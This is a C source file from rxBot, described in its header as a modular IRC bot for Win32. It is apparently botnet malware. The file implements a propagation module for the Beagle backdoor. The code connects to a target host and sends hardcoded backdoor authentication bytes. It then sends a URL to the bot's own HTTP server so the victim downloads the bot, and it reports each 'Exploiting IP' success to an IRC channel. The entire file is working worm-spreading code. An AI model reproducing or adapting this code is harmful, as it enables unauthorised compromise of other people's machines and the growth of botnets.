/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_BEAGLE

char BeagleAuth1[] = "\x43\xFF\xFF\xFF\x30\x30\x30\x01\x0A\x1F\x2B\x28\x2B\xA1\x32\x01";
char BeagleAuth2[] = "\x43\xFF\xFF\xFF\x30\x30\x30\x01\x0A\x28\x91\xA1\x2B\xE6\x60\x2F\x32\x8F\x60\x15\x1A\x20\x1A";

BOOL Beagle(EXINFO exinfo)
{
	char *BeagleAuth, buffer[IRCLINE], botfile[MAX_PATH], fname[_MAX_FNAME], ext[_MAX_EXT];

	BOOL success = FALSE;

	WSADATA WSAData; 
	if (fWSAStartup(MAKEWORD(1,1), &WSAData)!=0) 
		return FALSE; 

	SOCKET sSock;
	if((sSock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		SOCKADDR_IN ssin;
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
		ssin.sin_port = fhtons(exinfo.port);

		if(fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			BeagleAuth = ((strcmp(exinfo.command, "beagle1") == 0)?(BeagleAuth1):(BeagleAuth2));
			if(fsend(sSock, BeagleAuth, sizeof(BeagleAuth), 0) != SOCKET_ERROR) {
				if (frecv(sSock, buffer, 8, 0) != SOCKET_ERROR) {
					GetModuleFileName(0, botfile, sizeof(botfile));
					_splitpath(botfile, NULL, NULL, fname, ext);
					_snprintf(botfile, sizeof(botfile), "%s%s", fname, ext);
					_snprintf(buffer,sizeof(buffer),"http://%s:%s/%s", GetIP(sSock), httpport, botfile);

					if(fsend(sSock, buffer, sizeof(buffer), 0)) 
						success = TRUE;
				}
			}
		}
	}

	fclosesocket(sSock);
	fWSACleanup();

	if (success) {
		_snprintf(buffer, sizeof(buffer), "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
		if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
		addlog(buffer);
		exploit[exinfo.exploit].stats++;
	}

	return (success);
}
#endif